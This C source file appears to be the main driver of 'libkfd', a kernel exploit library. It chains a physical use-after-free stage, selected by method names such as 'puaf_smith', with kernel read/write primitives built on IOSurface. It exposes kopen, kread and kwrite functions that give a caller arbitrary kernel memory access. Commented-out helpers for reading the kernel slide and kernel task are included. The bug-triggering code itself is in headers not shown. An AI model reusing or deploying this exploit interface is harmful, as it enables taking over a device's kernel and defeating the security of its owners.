/*
 * Copyright (c) 2023 Félix Poulin-Bélanger. All rights reserved.
 */

/*
 * The global configuration parameters of libkfd.
 */
#define CONFIG_ASSERT 1
#define CONFIG_PRINT 1
#define CONFIG_TIMER 1

#include "common.h"
#include "info.h"
#include "puaf.h"
#include "krkw.h"
#include "perf.h"

struct kfd* kfd_init(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
{
    struct kfd* kfd = (struct kfd*)(malloc_bzero(sizeof(struct kfd)));
    info_init(kfd);
    puaf_init(kfd, puaf_pages, puaf_method);
    krkw_init(kfd, kread_method, kwrite_method);
    perf_init(kfd);
    return kfd;
}

void kfd_free(struct kfd* kfd)
{
    perf_free(kfd);
    krkw_free(kfd);
    puaf_free(kfd);
    info_free(kfd);
    bzero_free(kfd, sizeof(struct kfd));
}

u64 kopen(u64 puaf_pages, u64 puaf_method, u64 kread_method, u64 kwrite_method)
{
    timer_start();

    const u64 puaf_pages_min = 16;
    const u64 puaf_pages_max = 2048;
    assert(puaf_pages >= puaf_pages_min);
    assert(puaf_pages <= puaf_pages_max);
    assert(puaf_method <= puaf_smith);
    assert(kread_method <= kread_IOSurface);
    assert(kwrite_method <= kwrite_IOSurface);

    struct kfd* kfd = kfd_init(puaf_pages, puaf_method, kread_method, kwrite_method);
    puaf_run(kfd);
    krkw_run(kfd);
    info_run(kfd);
    perf_run(kfd);
    puaf_cleanup(kfd);

    timer_end();
    return (u64)(kfd);
}

void kread(u64 kfd, u64 kaddr, void* uaddr, u64 size)
{
    krkw_kread((struct kfd*)(kfd), kaddr, uaddr, size);
}

void kwrite(u64 kfd, void* uaddr, u64 kaddr, u64 size)
{
    krkw_kwrite((struct kfd*)(kfd), uaddr, kaddr, size);
}

void kclose(u64 kfd)
{
    kfd_free((struct kfd*)(kfd));
}

//u64 get_kernel_slide() {
//    return ((struct kfd *)kfd)->info.kernel.kernel_slide;
//}
//
//u64 get_current_proc() {
//    return ((struct kfd *)kfd)->info.kernel.current_proc;
//}
//
//u64 get_current_task() {
//    return ((struct kfd *)kfd)->info.kernel.current_task;
//}
//
//u64 get_kernel_proc() {
//    return ((struct kfd *)kfd)->info.kernel.kernel_proc;
//}
//
//u64 get_kernel_task() {
//    return ((struct kfd *)kfd)->info.kernel.kernel_task;
//}

